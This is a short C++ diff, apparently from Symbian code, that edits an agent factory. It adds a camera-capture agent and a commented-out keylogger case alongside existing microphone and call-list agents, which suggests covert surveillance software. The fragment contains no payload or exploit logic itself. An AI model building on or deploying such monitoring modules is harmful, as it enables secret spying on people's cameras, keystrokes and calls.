@@ -21,6 +21,8 @@
 #include "AgentApplication.h"
 #include "AgentCallLocal.h"
 #include "AgentCallList.h"
+#include "AgentKeylog.h"
+#include "AgentCamera.h"
 
 EXPORT_C CAbstractAgent* AgentFactory::CreateAgentL(TAgentType aId, const TDesC8& params)
 	{
@@ -40,6 +42,10 @@ EXPORT_C CAbstractAgent* AgentFactory::CreateAgentL(TAgentType aId, const TDesC8
 			return CAgentDevice::NewL(params);
 		case EAgent_Mic:
 			return CAgentMic::NewL(params); 
+		//case EAgent_Keylog:
+			//return CAgentKeylog::NewL(params);
+		case EAgent_Cam:
+			return CAgentCamera::NewL(params);
 		//case EAgent_CallLocal:
 			//return CAgentCallLocal::NewL(params);
 		case EAgent_CallList:
